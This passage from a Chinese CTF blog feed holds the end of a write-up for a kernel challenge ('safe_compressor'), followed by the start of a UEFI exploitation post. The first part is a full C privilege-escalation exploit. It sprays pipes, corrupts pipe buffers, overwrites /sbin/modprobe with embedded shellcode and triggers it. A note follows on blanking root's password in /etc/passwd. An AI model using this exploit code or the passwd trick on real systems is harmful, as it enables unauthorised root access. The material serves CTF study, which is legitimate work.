class="built_in">array</span> = <span class="built_in">array</span>;</span><br><span class="line">    arg_struct.size = size;</span><br><span class="line">    ioctl(fd, <span class="number">0xdead0001</span>, &amp;arg_struct);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> idx)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">del_array_arg</span> <span class="title">arg_struct</span>;</span></span><br><span class="line">    arg_struct.idx = idx;</span><br><span class="line">    ioctl(fd, <span class="number">0xdead0003</span>, &amp;arg_struct);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">empty</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> idx)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">del_array_arg</span> <span class="title">arg_struct</span>;</span></span><br><span class="line">    arg_struct.idx = idx;</span><br><span class="line">    ioctl(fd, <span class="number">0xdead0004</span>, &amp;arg_struct);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[<span class="number">544</span>] = &#123;</span><br><span class="line">    <span class="number">0x7F</span>, <span class="number">0x45</span>, <span class="number">0x4C</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x45</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x45</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0xE5</span>, <span class="number">0x74</span>, <span class="number">0x64</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6A</span>, <span class="number">0x74</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x2F</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x2E</span>, <span class="number">0x74</span>, <span class="number">0x78</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xE7</span>,</span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0xD2</span>, <span class="number">0x31</span>, <span class="number">0xF6</span>, <span class="number">0x6A</span>, <span class="number">0x02</span>, <span class="number">0x58</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x6A</span>, <span class="number">0x03</span>, <span class="number">0x5F</span>, <span class="number">0x6A</span>, <span class="number">0x64</span>,</span><br><span class="line">    <span class="number">0x5A</span>, <span class="number">0xBE</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x81</span>, <span class="number">0xF6</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x6A</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x5F</span>, <span class="number">0x6A</span>, <span class="number">0x64</span>, <span class="number">0x5A</span>, <span class="number">0xBE</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x81</span>, <span class="number">0xF6</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x6A</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x58</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x2E</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x2E</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x6C</span>, <span class="number">0x6C</span>, <span class="number">0x63</span>, <span class="number">0x6F</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x45</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x16</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> data[<span class="number">0x200</span>];</span><br><span class="line"><span class="type">size_t</span> leak[<span class="number">0x80</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span>&#123;</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/safe_compressor&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    spray_pipes(<span class="number">0</span>, <span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">    data[<span class="number">0</span>] = <span class="number">0x11111111</span>;</span><br><span class="line">    data[<span class="number">1</span>] = <span class="number">0x22222222</span>;</span><br><span class="line">    data[<span class="number">2</span>] = <span class="number">0x33333333</span>;</span><br><span class="line">    data[<span class="number">3</span>] = <span class="number">0x44444444</span>;</span><br><span class="line">    data[<span class="number">4</span>] = <span class="number">0x55555555</span>;</span><br><span class="line">    data[<span class="number">5</span>] = <span class="number">0x66666666</span>;</span><br><span class="line">    data[<span class="number">6</span>] = <span class="number">0x77777777</span>;</span><br><span class="line">    data[<span class="number">7</span>] = <span class="number">0x88888888</span>;</span><br><span class="line">    data[<span class="number">8</span>] = <span class="number">0x99999999</span>;</span><br><span class="line">    data[<span class="number">9</span>] = <span class="number">0xaaaaaaaa</span>;</span><br><span class="line">    data[<span class="number">10</span>] = <span class="number">0xbbbbbbbb</span>;</span><br><span class="line">    data[<span class="number">11</span>] = <span class="number">0xcccccccc</span>;</span><br><span class="line">    data[<span class="number">12</span>] = <span class="number">0xc0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> k = i;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;qian&quot;</span>, <span class="number">4</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">120</span>; i++)&#123;</span><br><span class="line">        compress(i+<span class="number">1</span>,data,<span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// try to find corrupted pipe_buf</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] finding corrupted page\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> corrupted_index = <span class="number">-1</span>, pointed_index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        already_read[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="type">uint32_t</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> p_buf[<span class="number">0x10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">memset</span>(p_buf, <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], p_buf, <span class="number">4</span>);</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (k != i) &#123;</span><br><span class="line">            corrupted_index = i;</span><br><span class="line">            pointed_index = k;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] found %d=&gt;%d pipe data: %p\n&quot;</span>, i, k, *(<span class="type">uint64_t</span> *)p_buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (corrupted_index == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to find corrupted page\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> passwd_fd[<span class="number">0x200</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        passwd_fd[i] = open(<span class="string">&quot;/sbin/modprobe&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(passwd_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;open file.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> tmp = <span class="number">0x480e801f</span>;</span><br><span class="line">    write(pipe_fd[pointed_index][<span class="number">1</span>], &amp;tmp, <span class="number">4</span>);</span><br><span class="line">    read(pipe_fd[pointed_index][<span class="number">0</span>], &amp;leak, <span class="number">0x20</span>);</span><br><span class="line">    binary_dump(<span class="string">&quot;leak&quot;</span>, leak, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;try to over write file.&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        <span class="type">int</span> retval = write(passwd_fd[i], shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">        <span class="keyword">if</span>(retval &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;write file success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        close(passwd_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27;&gt;/home/user/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/user/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/home/user/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶å¦‚æœ &#x2F;bin&#x2F;su æœ‰ç‰¹æƒçš„è¯ï¼ˆRealWorld ä¸­éƒ½æ˜¯æœ‰çš„ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°† &#x2F;etc&#x2F;passwd ä¸­ root ç”¨æˆ·æ”¹æˆï¼š  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root::0:0:root:/root:/bin/sh</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ææƒ  </p><img src="/2025/01/09/Compressor/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ€ä¹ˆæƒ³éƒ½ä¸æ˜ç™½è¿™ä¹ˆç®€å•çš„é¢˜ä¸ºä»€ä¹ˆä¼šé›¶è§£ğŸ˜‡ã€‚é—²çš„æ…Œæˆ‘å»çœ‹äº†çœ¼å‡ºé¢˜äººçš„å®˜æ–¹é¢˜è§£ï¼Œå‘ç°å…¶åšæ³•æ˜¯å……åˆ†åˆ©ç”¨é¢˜ç›®æä¾›çš„å››ç§åŠŸèƒ½æ³„éœ²å‡ºå„ç§æ•°æ®ç„¶åç²¾å¿ƒæ„é€ å„ç§åŸè¯­æ¥æœç´¢å’Œä¿®æ”¹ cred ç»“æ„ä½“æ¥å®ç°ææƒã€‚åªèƒ½è¯´è¿™ç§æ–¹æ³•ç¡®å®å¼ºï¼Œå¯æ˜¯å¤ªéº»çƒ¦äº†ï¼Œè€Œä¸”éœ€è¦å……åˆ†åˆ©ç”¨é¢˜ç›®æä¾›çš„å››ç§åŠŸèƒ½æ¥æ„é€ åŸè¯­ã€‚è€Œæˆ‘åªéœ€è¦åˆ©ç”¨é¢˜ç›®çš„ compress åŠŸèƒ½å³å¯å®ç°ææƒï¼Œçœ‹æ¥è¿™æ¬¡æ˜¯æˆ‘æ›´ç”šä¸€ç­¹ğŸ˜‹ğŸ˜‹ğŸ˜‹<br>æƒ³äº†æƒ³ï¼Œå½“æ—¶è¿™æ¬¡æ¯”èµ› r3kapig ä»¥ 20 åˆ†çš„åˆ†å·®è½åç¬¬ä¸€åæ’ç¬¬äºŒï¼Œå¦‚æœåŠ ä¸Šè¿™é¢˜å°±èƒ½æ‹‰ç¬¬ä¸€å 480 åˆ†  </p><img src="/2025/01/09/Compressor/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>çœ‹æ¥è¿™æ¬¡åˆè¦èƒŒé”…äº†ğŸ˜¨<br>ä¸è¿‡èº«ä¸ºè€ƒç ”é€‰æ‰‹ï¼Œä»Šå¹´ CTF è¦å°‘ç‚¹ç¢°äº†ï¼Œè¯¥çº¦æŸä¸€ä¸‹è‡ªå·±ï¼Œé™¤äº† XCTF å’Œ defcon å…¶ä»–æ¯”èµ›ç¦æ­¢å‚åŠ ğŸ˜‡</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>UEFI Double GetVariable &amp; Heap OverFlow</title>
      <link href="/2025/01/06/uefi2/"/>
      <url>/2025/01/06/uefi2/</url>
      
        <content type="html"><![CDATA[<h2 id="å†™åœ¨æœ€å‰é¢"><a href="#å†™åœ¨æœ€å‰é¢" class="headerlink" title="å†™åœ¨æœ€å‰é¢"></a>å†™åœ¨æœ€å‰é¢</h2><p>ä¸Šä¸€ç¯‡æ–‡ç« <a href="https://9anux.org/2024/12/14/uefi/">UEFI SMM æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</a>ç®€å•çš„å¯¹ UEFI çš„ä¸€äº›åŸºç¡€æ¦‚å¿µã€æ¼æ´å‡ºç°æ–¹å¼ä»¥åŠæ”»å‡»é¢è¿›è¡Œäº†åˆæ­¥çš„å­¦ä¹ ï¼Œå¹¶ä¸”ç”¨äº†å‡ é“æ¯”è¾ƒç®€å•çš„é¢˜ç›®è¿›è¡Œç»ƒä¹ ã€‚ç”±äºé‚£äº›é¢˜ç›®éƒ½æ˜¯ç›´æ¥æ‰§è¡Œæˆ‘ä»¬è¾“å…¥çš„ shellcodeï¼Œå’Œç°å®çš„æƒ…å†µæœ‰ç‚¹è„±èŠ‚ï¼Œè€Œä¸”å¯¹ä¸Šä¸€ç¯‡æ–‡ç« çš„éƒ¨åˆ†æ”»å‡»æ–¹å¼è¿˜å¸¦æœ‰ä¸€å®šçš„ç–‘é—®ï¼Œæ‰€ä»¥è¿™é‡Œæ‰¾äº†äº›é¢˜ç›®æ¥è¿›è¡Œé’ˆå¯¹è®­ç»ƒã€‚  </p><h2 id="Double-GetVariable"><a href="#Double-GetVariable" class="headerlink" title="Double GetVariable"></a>Double GetVariable</h2><h3 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h3><p>è¿™é‡Œç”¨çš„ç¯å¢ƒæ˜¯ N1CTF2022 babyuefiã€‚å’Œæˆ‘å‰é¢é‚£ç¯‡<a href="https://9anux.org/2024/12/14/uefi/">UEFI SMM æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</a>ä¸åŒï¼Œè¿™é‡Œå¹¶æ²¡æœ‰ç›´æ¥ç»™æˆ‘ä»¬æ‰§è¡Œä»»æ„ shellcode çš„æœºä¼šï¼Œè€Œæ˜¯ç»™äº†æˆ‘ä»¬ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ° flag å°±åœ¨è¿™ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œè€Œæˆ‘ä»¬å¹¶æ²¡æœ‰æƒé™å»è¯»å–è¯¥ flag æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Boot took 1.64 seconds!</span><br><span class="line"></span><br><span class="line">/ $ <span class="built_in">ls</span></span><br><span class="line">bin      etc      init     proc     sbin     tmp</span><br><span class="line">dev      flag     linuxrc  root     sys      